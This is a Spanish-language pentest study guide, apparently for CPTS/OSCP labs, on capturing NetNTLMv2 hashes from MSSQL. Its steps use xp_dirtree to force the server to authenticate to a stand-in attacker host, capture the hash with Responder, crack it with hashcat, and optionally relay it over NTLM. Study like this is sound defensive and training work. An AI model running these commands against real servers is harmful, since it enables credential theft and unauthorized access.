
## 1. Robo de hashes NTLMv2 mediante MSSQL

Esta técnica permite capturar hashes **NetNTLMv2** utilizando la función `xp_dirtree` de MSSQL para forzar una autenticación SMB hacia un equipo controlado por el atacante.

**Importante:** `xp_dirtree` no es una vulnerabilidad por sí misma. El ataque aprovecha el mecanismo de autenticación SMB/NTLM de Windows.

No requiere un CVE específico.

### Concepto del ataque

1. Nos conectamos al servidor MSSQL con credenciales válidas.
    
2. Utilizamos `xp_dirtree` para intentar acceder a una carpeta compartida SMB remota.
    
3. El servicio MSSQL intenta autenticarse contra nuestro equipo.
    
4. Capturamos la autenticación NTLMv2 mediante herramientas como Responder.
    
5. Intentamos crackear la respuesta capturada o, si las condiciones lo permiten, realizar un ataque NTLM Relay.
    

---

## 2. Explotación mediante `xp_dirtree`

### Paso 1. Iniciar Responder

En nuestra máquina atacante:

```
sudo responder -I tun0
```

Sustituye `tun0` por la interfaz de red correspondiente.

### Paso 2. Forzar la autenticación SMB

Desde la sesión MSSQL:

```
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';
```

La función intenta enumerar el contenido de la ruta indicada. Si el servidor necesita acceder a un recurso SMB remoto, puede iniciar una autenticación NTLM contra nuestro equipo.

**Requisitos:** disponer de acceso a MSSQL y de permisos suficientes para ejecutar la función. El resultado también depende de la conectividad de red y de la configuración del servicio.

### Paso 3. Capturar el hash

Si la autenticación llega a nuestro equipo, Responder puede mostrar una captura similar a esta:

```
[SMB] NTLMv2-SSP Client   : 10.10.10.15
[SMB] NTLMv2-SSP Username : DOMAIN\sqlservice
[SMB] NTLMv2-SSP Hash     : sqlservice::DOMAIN:...
```

El hash capturado corresponde a una respuesta de autenticación **NetNTLMv2**, no al hash NTLM almacenado de la contraseña.

---

## 3. Crackear el hash NetNTLMv2

Guardar la captura en un archivo, por ejemplo `hash.txt`.

Utilizar Hashcat:

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

|Parámetro|Descripción|
|---|---|
|`-m 5600`|Selecciona el modo NetNTLMv2.|
|`hash.txt`|Archivo que contiene la captura.|
|`rockyou.txt`|Diccionario de contraseñas.|

Si el crackeo tiene éxito, obtendremos la contraseña en texto plano.

Esta contraseña podría permitir autenticarnos en otros servicios si la cuenta tiene acceso y las credenciales son válidas allí.

---

## 4. NTLM Relay

Otra posibilidad es retransmitir una autenticación NTLM hacia otro equipo.

El éxito depende de varios factores:

- Que el equipo de destino acepte la autenticación retransmitida.
    
- Que la cuenta autenticada tenga permisos suficientes en el destino.
    
- Que las protecciones de NTLM y SMB no impidan la retransmisión.
    

Si la cuenta tiene privilegios de administrador local en el equipo de destino, un ataque exitoso podría proporcionar acceso administrativo a ese equipo.

**Importante:** no debemos asumir que el relay permite obtener privilegios administrativos en el mismo servidor MSSQL que originó la autenticación. La retransmisión al host de origen está limitada por las protecciones implementadas por Microsoft.

## 5. Herramientas de captura

Las herramientas mencionadas en el módulo son:

|Herramienta|Uso|
|---|---|
|`Responder`|Capturar autenticaciones mediante servicios falsos y técnicas de envenenamiento de resolución de nombres.|
|`Wireshark`|Inspeccionar y analizar tráfico de red.|
|`tcpdump`|Capturar paquetes de red desde la terminal.|
|`Hashcat`|Intentar crackear hashes NetNTLMv2.|

## 6. Metodología para CPTS / OSCP

### Paso 1. Enumerar MSSQL

```
nmap -sC -sV -p1433 <IP>
```

### Paso 2. Conectarse a MSSQL

```
impacket-mssqlclient '<USER>:<PASSWORD>@<IP>'
```

### Paso 3. Iniciar Responder

```
sudo responder -I tun0
```

### Paso 4. Forzar la autenticación SMB

Desde MSSQL:

```
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\';
```

### Paso 5. Capturar la respuesta NetNTLMv2

Comprobar la salida de Responder y guardar la captura.

### Paso 6. Intentar crackearla

```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Paso 7. Evaluar el siguiente paso

Si obtenemos la contraseña, comprobar si permite acceder a otros servicios autorizados del laboratorio. Si no se consigue crackear, evaluar si existe una posibilidad legítima de NTLM Relay según las condiciones del entorno.

---

## 7. Puntos clave

- `xp_dirtree` es una función de MSSQL que permite enumerar directorios locales o remotos.
    
- **No es una vulnerabilidad por sí misma:** se aprovecha el mecanismo de autenticación SMB/NTLM.
    
- Una ruta SMB remota puede provocar que el servicio MSSQL intente autenticarse contra nuestro equipo.
    
- Responder puede capturar la respuesta de autenticación NetNTLMv2.
    
- `hashcat -m 5600` permite intentar crackearla.
    
- Una contraseña recuperada puede facilitar el acceso a otros servicios si las credenciales son válidas.
    
- NTLM Relay puede permitir el acceso a otro equipo si la autenticación es retransmisible y la cuenta tiene los privilegios necesarios.
    
- Capturar un hash no significa haber obtenido automáticamente la contraseña ni acceso administrativo.
